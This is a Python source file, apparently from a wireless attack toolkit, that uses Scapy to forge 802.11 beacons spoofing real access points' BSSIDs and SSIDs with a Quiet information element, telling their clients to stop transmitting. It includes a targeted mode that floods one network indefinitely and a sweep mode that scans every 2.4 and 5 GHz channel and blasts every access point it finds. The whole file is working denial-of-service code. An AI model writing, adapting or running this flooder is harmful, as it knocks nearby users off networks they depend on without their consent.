# sleep
import subprocess
import threading
import time

from scapy.all import (
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11EltRates,
    RadioTap,
    sendp,
    sniff,
)
from scapy.error import Scapy_Exception

from debugs import debug

_BCAST = "ff:ff:ff:ff:ff:ff"

_QUIET_COUNT = 1
_QUIET_PERIOD = 0
_QUIET_DURATION = 65535
_QUIET_OFFSET = 0

_BURST = 3
_INTER = 0.0005
_RATES = b"\x82\x84\x8b\x96\x0c\x12\x18\x24"

_SCAN_BUDGET = 8
_SWEEP_PAUSE = 30
_DWELL = 0.25

_ALL_24 = list(range(1, 14))
_ALL_5 = [36, 40, 44, 48, 52, 56, 60, 64,
          100, 104, 108, 112, 116, 120, 124, 128,
          132, 136, 140, 144, 149, 153, 157, 161, 165]


def _quiet_ie():
    body = bytes([
        _QUIET_COUNT & 0xFF,
        _QUIET_PERIOD & 0xFF,
        (_QUIET_DURATION >> 8) & 0xFF, _QUIET_DURATION & 0xFF,
        (_QUIET_OFFSET >> 8) & 0xFF, _QUIET_OFFSET & 0xFF,
    ])
    return Dot11Elt(ID=40, info=body)


def _set_channel(iface, ch):
    try:
        subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)],
                       capture_output=True, check=False, timeout=2)
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass


def _resolve_channels(channel_target):
    if channel_target is None or channel_target == "all":
        return _ALL_24 + _ALL_5
    if isinstance(channel_target, int):
        return [channel_target]
    return [int(c) for c in channel_target]


def _build_beacon(bssid, ssid, channel):
    dot11 = Dot11(
        type=0, subtype=8,
        addr1=_BCAST, addr2=bssid, addr3=bssid,
    )
    return bytes(
        RadioTap() / dot11
        / Dot11Beacon(cap="ESS")
        / Dot11Elt(ID="SSID", info=ssid)
        / Dot11EltRates(rates=list(_RATES))
        / Dot11Elt(ID="DSset", info=bytes([channel & 0xFF]))
        / _quiet_ie()
    )


def _scan_pass(iface, channels, timeout, known):
    """
    Single sweep. Returns dict {bssid: {bssid, ssid, channel}} for APs
    not already in `known`.
    """
    found = {}
    wanted = set(channels)
    stop = threading.Event()

    def _handler(pkt):
        if not pkt.haslayer(Dot11Beacon):
            return
        try:
            bssid = pkt[Dot11].addr3
            if not bssid or bssid.lower() == _BCAST:
                return
            key = bssid.lower()
            if key in known or key in found:
                return

            ssid = None
            ch = None
            elt = pkt.getlayer(Dot11Elt)
            while elt is not None:
                if elt.ID == 0 and elt.info is not None:
                    try:
                        ssid = elt.info.decode(errors="ignore")
                    except (UnicodeDecodeError, AttributeError) as e:
                        debug("warn", f"quiet scan: SSID decode failed: {e}")
                        ssid = ""
                elif elt.ID == 3 and elt.info and len(elt.info) >= 1 or elt.ID == 61 and elt.info and len(elt.info) >= 1:
                    ch = elt.info[0]
                elif elt.ID == 192 and elt.info and len(elt.info) >= 2:
                    ch = elt.info[1]
                try:
                    elt = elt.payload.getlayer(Dot11Elt)
                except (AttributeError, Scapy_Exception) as e:
                    debug("warn", f"quiet scan: IE chain parse failed: {e}")
                    elt = None

            if ch is None or ch not in wanted:
                return
            found[key] = {"bssid": bssid, "ssid": ssid or "", "channel": ch}
        except (AttributeError, TypeError, ValueError, Scapy_Exception) as e:
            debug("warn", f"quiet scan: handler parse error: {e}")
            return

    def _hopper():
        i = 0
        n = len(channels)
        while not stop.is_set():
            _set_channel(iface, channels[i % n])
            i += 1
            time.sleep(_DWELL)

    def _sniffer():
        while not stop.is_set():
            try:
                sniff(iface=iface, prn=_handler, timeout=0.5, store=False)
            except (Scapy_Exception, OSError) as e:
                debug("warn", f"quiet scan: sniff error: {e}")
                time.sleep(0.1)

    hop_thread = threading.Thread(target=_hopper, daemon=True)
    snf_thread = threading.Thread(target=_sniffer, daemon=True)
    hop_thread.start()
    snf_thread.start()

    start = time.time()
    try:
        while time.time() - start < timeout:
            time.sleep(0.1)
    except KeyboardInterrupt:
        stop.set()
        hop_thread.join(timeout=1)
        snf_thread.join(timeout=1)
        raise
    finally:
        stop.set()
        hop_thread.join(timeout=1)
        snf_thread.join(timeout=1)

    return found


def _blast(iface, aps, duration):
    """
    Send a Quiet beacon to each AP in `aps` for `duration` seconds.
    Hopper adjusts channel per AP before sending.
    """
    if not aps:
        return
    stop = threading.Event()

    def _worker():
        while not stop.is_set():
            for ap in aps:
                if stop.is_set():
                    return
                _set_channel(iface, ap["channel"])
                raw = _build_beacon(ap["bssid"], ap["ssid"], ap["channel"])
                try:
                    sendp(raw, iface=iface, count=_BURST, verbose=False,
                          realtime=False, inter=0)
                except (Scapy_Exception, OSError) as e:
                    debug("critical", f"quiet_flood: send failed: {e}")
                    stop.set()
                    return
                time.sleep(_INTER)

    worker = threading.Thread(target=_worker, daemon=True)
    worker.start()
    try:
        time.sleep(duration)
    finally:
        stop.set()
        worker.join(timeout=2)


def quiet_targeted(iface, bssid, ssid=None, channel=None):
    """
    Quiet attack against a single BSSID, broadcast to all its clients.
    Runs indefinitely (one-shot beacon flood).
    """
    if ssid is None or channel is None:
        info = _sniff_bssid(iface, bssid, timeout=5)
        if not info:
            debug("warn", f"quiet_targeted: no beacon from {bssid}, aborting")
            return
        ssid = ssid if ssid is not None else info["ssid"]
        channel = channel if channel is not None else info["channel"]

    raw = _build_beacon(bssid, ssid, channel)

    debug("ok", f"quiet_targeted: running on {bssid} "
                f"(ssid={ssid!r} ch={channel})")

    stop = threading.Event()
    worker = threading.Thread(target=_quiet_worker,
                              args=(stop, iface, raw), daemon=True)
    worker.start()
    try:
        while worker.is_alive():
            time.sleep(0.1)
    except KeyboardInterrupt:
        debug("info", "quiet_targeted: interrupted")
    finally:
        stop.set()
        worker.join(timeout=2)


def _quiet_worker(stop, iface, raw):
    while not stop.is_set():
        try:
            sendp(raw, iface=iface, count=_BURST, verbose=False,
                  realtime=False, inter=0)
        except (Scapy_Exception, OSError) as e:
            debug("critical", f"quiet: send failed: {e}")
            stop.set()
            return
        time.sleep(_INTER)


def _sniff_bssid(iface, bssid, timeout=5):
    found = {}

    def _h(pkt):
        if found or not pkt.haslayer(Dot11Beacon):
            return
        if pkt[Dot11].addr3.lower() != bssid.lower():
            return
        ssid = None
        ch = None
        elt = pkt.getlayer(Dot11Elt)
        while elt is not None:
            if elt.ID == 0 and elt.info is not None:
                try:
                    ssid = elt.info.decode(errors="ignore")
                except (UnicodeDecodeError, AttributeError) as e:
                    debug("warn", f"quiet bssid sniff: SSID decode failed: {e}")
                    ssid = ""
            elif elt.ID == 3 and elt.info and len(elt.info) >= 1 or elt.ID == 61 and elt.info and len(elt.info) >= 1:
                ch = elt.info[0]
            elif elt.ID == 192 and elt.info and len(elt.info) >= 2:
                ch = elt.info[1]
            try:
                elt = elt.payload.getlayer(Dot11Elt)
            except (AttributeError, Scapy_Exception) as e:
                debug("warn", f"quiet bssid sniff: IE chain parse failed: {e}")
                elt = None
        if ch is None:
            return
        found["ssid"] = ssid or ""
        found["channel"] = ch

    sniff(iface=iface, prn=_h, timeout=timeout, store=False)
    return found


def quiet_flood(iface, channel_target=None):
    channels = _resolve_channels(channel_target)

    debug("ok", f"quiet_flood: starting continuous sweep on "
                f"{len(channels)} channel(s)")

    known = {}   # bssid_lower -> {bssid, ssid, channel}
    cycle = 0

    try:
        while True:
            cycle += 1
            debug("info", f"quiet_flood: cycle {cycle} — scanning")

            found = _scan_pass(iface, channels, _SCAN_BUDGET, known)
            if found:
                known.update(found)
                for ap in found.values():
                    debug("ok", f"quiet_flood: + {ap['ssid'] or '<hidden>'} "
                                f"({ap['bssid']}) ch {ap['channel']}")
            else:
                debug("info", f"quiet_flood: cycle {cycle} found no new APs")

            debug("ok", f"quiet_flood: cycle {cycle} blasting "
                        f"{len(known)} AP(s) for {_SWEEP_PAUSE}s")

            _blast(iface, list(known.values()), _SWEEP_PAUSE)

    except KeyboardInterrupt:
        debug("info", "quiet_flood: interrupted")
    finally:
        debug("info", f"quiet_flood: stopped after {cycle} cycle(s), "
                      f"{len(known)} AP(s) tracked")